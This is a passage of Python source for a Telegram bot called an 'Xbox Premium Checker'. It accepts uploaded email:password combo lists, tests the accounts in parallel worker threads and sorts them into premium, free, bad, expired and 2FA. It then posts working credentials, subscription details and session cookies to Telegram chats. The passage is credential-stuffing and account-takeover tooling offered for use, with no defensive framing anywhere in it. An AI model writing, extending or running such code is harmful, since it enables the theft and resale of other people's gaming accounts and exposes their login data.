            f"{e}:{p} | {d.get('subscription', d.get('premium_type', 'UNKNOWN'))} | {d.get('days_remaining', '0')} days" 
            for e, p, d in premium_results[:50]
        ])
        
        asyncio.run_coroutine_threadsafe(
            send_final_results(task, stats, premium_text, len(gamepass_results)), 
            loop
        )
        
    except Exception as e:
        asyncio.run_coroutine_threadsafe(send_error_message(task, str(e)[:500]), loop)
    finally:
        with active_tasks_lock:
            if task.file_id in active_tasks:
                del active_tasks[task.file_id]
        if task.file_path and os.path.exists(task.file_path):
            try:
                shutil.rmtree(os.path.dirname(task.file_path))
            except:
                pass


def worker_loop():
    while True:
        try:
            with active_tasks_lock:
                current_active = len(active_tasks)
            if current_active >= MAX_CONCURRENT_WORKERS:
                time.sleep(0.3)
                continue
            try:
                task = task_queue.get(timeout=1)
            except queue.Empty:
                time.sleep(0.5)
                continue
            with active_tasks_lock:
                active_tasks[task.file_id] = task
            asyncio.run_coroutine_threadsafe(send_processing_start(task), loop)
            thread = threading.Thread(target=process_single_file, args=(task,))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"Worker error: {e}")
            time.sleep(1)


async def send_processing_start(task):
    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 {task.original_name}\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}"
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=msg, parse_mode=ParseMode.MARKDOWN)


async def send_batch_update(task, batch_results, stats):
    progress = f"📄 **File:** {task.original_name}\n📊 **Progress:** {stats['checked']}/{stats['total']} | ✅ {stats['premium']} | 🆓 {stats['free']} | ❌ {stats['bad']}\n\n"
    results_text = "\n".join(batch_results[:20])
    if len(batch_results) > 20:
        results_text += f"\n... and {len(batch_results) - 20} more"
    message = progress + "```\n" + results_text[:3000] + "\n```"
    try:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=message[:4096], parse_mode=ParseMode.MARKDOWN)
    except:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=progress, parse_mode=ParseMode.MARKDOWN)


async def send_skip_notification(task, stats, consecutive_failures):
    msg = f"⚠️ **SKIP TRIGGERED**\n\n📄 {task.original_name}\n❌ {consecutive_failures} consecutive failures.\n⏭️ Remaining {stats.get('skipped_consecutive', 0)} accounts skipped.\n✅ Moving to next file."
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=msg, parse_mode=ParseMode.MARKDOWN)


async def send_final_results(task, stats, premium_text, gamepass_count):
    duration = (datetime.now() - task.created_at).total_seconds()
    
    domain_info = f"\n🌐 Domain filtered: {stats.get('skipped_domain', 0)} skipped" if stats.get('skipped_domain', 0) > 0 else ""
    skip_info = f"\n⏭️ Consecutive skip: {stats.get('skipped_consecutive', 0)}" if stats.get('skipped_consecutive', 0) > 0 else ""
    
    receipt = (
        f"✅ **SCAN COMPLETE**\n\n"
        f"📄 **File:** {task.original_name}\n"
        f"⏱️ **Duration:** {duration:.1f}s\n\n"
        f"📊 **FINAL RESULTS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 Total in file: {stats.get('total_original', stats['total'])}\n"
        f"✅ Valid accounts: {stats['total']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 PREMIUM: {stats['premium']} (GamePass to Premium Bot: {gamepass_count})\n"
        f"🆓 FREE: {stats['free']}\n"
        f"❌ BAD: {stats['bad']}\n"
        f"⏰ EXPIRED: {stats['expired']}\n"
        f"🔒 2FA: {stats['two_factor']}\n"
        f"{domain_info}{skip_info}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=receipt, parse_mode=ParseMode.MARKDOWN)
    
    if stats['premium'] > 0 and premium_text:
        await app.bot.send_message(
            chat_id=int(TELEGRAM_CHAT_ID),
            text=f"🎮 **ALL PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:3500]}\n```",
            parse_mode=ParseMode.MARKDOWN
        )
    
    with active_tasks_lock:
        remaining = task_queue.qsize()
    if remaining > 0:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"📁 {remaining} file(s) still in queue...", parse_mode=ParseMode.MARKDOWN)
    else:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"✅ Queue empty! Send more .txt files to scan.", parse_mode=ParseMode.MARKDOWN)


async def send_error_message(task, error):
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"❌ **ERROR**\n\n📄 {task.original_name}\n```\n{error[:500]}\n```", parse_mode=ParseMode.MARKDOWN)


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    domain_status = f"🌐 Domain filter: {'ON - ' + ', '.join(DOMAIN_WHITELIST[:5]) + '...' if DOMAIN_WHITELIST else 'OFF'}"
    msg = (
        f"🎮 **XBOX PREMIUM CHECKER - GOD MODE v5.0**\n\n"
        f"⚡ **Workers:** {MAX_CONCURRENT_WORKERS}\n"
        f"✅ **Checker:** DanteLogic (Advanced)\n"
        f"{domain_status}\n"
        f"⏭️ **Skip after:** {SKIP_ON_CONSECUTIVE_FAILURES} failures\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📨 **Premium Bot (GamePass ONLY):** Active\n"
        f"✨ **Format:** Aesthetic 'pookie' style\n"
        f"🚫 **Files to Premium Bot:** BLOCKED\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"**Commands:**\n/start - This message\n/status - Queue status\n\n"
        f"**Send a .txt file** (email:password per line)\n"
        f"GamePass hits → Premium Bot (aesthetic + REAL cookies)\n"
        f"All other hits → Main Bot (text)"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with active_tasks_lock:
        active_count = len(active_tasks)
        queue_size = task_queue.qsize()
    msg = f"📊 **QUEUE STATUS**\n\n⚡ Active Workers: {active_count}/{MAX_CONCURRENT_WORKERS}\n⏳ Queue Size: {queue_size}\n🔄 Processing: {'Yes' if active_count > 0 else 'No'}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file with email:password format.")
        return
    
    file = await context.bot.get_file(document.file_id)
    temp_dir = tempfile.mkdtemp()
    temp_path = os.path.join(temp_dir, document.file_name)
    await file.download_to_drive(temp_path)
    
    try:
        with open(temp_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        valid_count = len(lines)
    except:
        valid_count = 0
    
    if valid_count == 0:
        await update.message.reply_text(f"❌ **FILE REJECTED**\n\n📄 {document.file_name}\nNo valid email:password lines.", parse_mode=ParseMode.MARKDOWN)
        shutil.rmtree(temp_dir)
        return
    
    if DOMAIN_WHITELIST:
        allowed_count = sum(1 for l in lines if is_domain_allowed(l.split(':', 1)[0]))
        filtered_msg = f"\n🌐 Domain filter: {allowed_count}/{valid_count} allowed"
    else:
        allowed_count = valid_count
        filtered_msg = ""
    
    task = ScanTask(file_path=temp_path, original_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
    task_queue.put(task)
    
    with active_tasks_lock:
        queue_size = task_queue.qsize()
        active_count = len(active_tasks)
    
    await update.message.reply_text(
        f"✅ **FILE ACCEPTED**\n\n"
        f"📄 {document.file_name}\n"
        f"🔢 Accounts: {valid_count}{filtered_msg}\n"
        f"📊 Position: {queue_size} in queue\n"
        f"⚡ Active workers: {active_count}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎮 **GamePass hits** → Premium Bot (aesthetic + REAL cookies)\n"
        f"📝 **Other hits** → Main Bot only\n"
        f"🚫 **No files** sent to Premium Bot",
        parse_mode=ParseMode.MARKDOWN
    )


def main():
    global app, loop
    app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    for _ in range(MAX_CONCURRENT_WORKERS):
        threading.Thread(target=worker_loop, daemon=True).start()
    
    print("=" * 60)
    print("🎮 XBOX PREMIUM CHECKER - GOD MODE v5.0 (DanteLogic + REAL COOKIES)")
    print("=" * 60)
    print(f"✅ MAIN BOT (control): {TELEGRAM_BOT_TOKEN_MAIN[:20]}...")
    print(f"✅ PREMIUM BOT (GamePass ONLY): {TELEGRAM_BOT_TOKEN_PREMIUM[:20]}...")
    print(f"✅ Chat ID: {TELEGRAM_CHAT_ID}")
    print(f"⚡ Workers: {MAX_CONCURRENT_WORKERS}")
    print(f"⏭️ Skip after: {SKIP_ON_CONSECUTIVE_FAILURES} failures")
    print(f"🌐 Domain filter: {DOMAIN_WHITELIST if DOMAIN_WHITELIST else 'OFF'}")
    print(f"✨ GamePass hits → Premium Bot with aesthetic 'pookie' format")
    print(f"🍪 REAL Cookies from https://www.xbox.com/en-US/play")
    print(f"🚫 No other files/logs sent to Premium Bot")
    print("=" * 60)
    
    port = int(os.environ.get("PORT", 8080))
    print(f"🌐 Railway ready on port {port}")
    
    app.run_polling()


if __name__ == "__main__":
    main()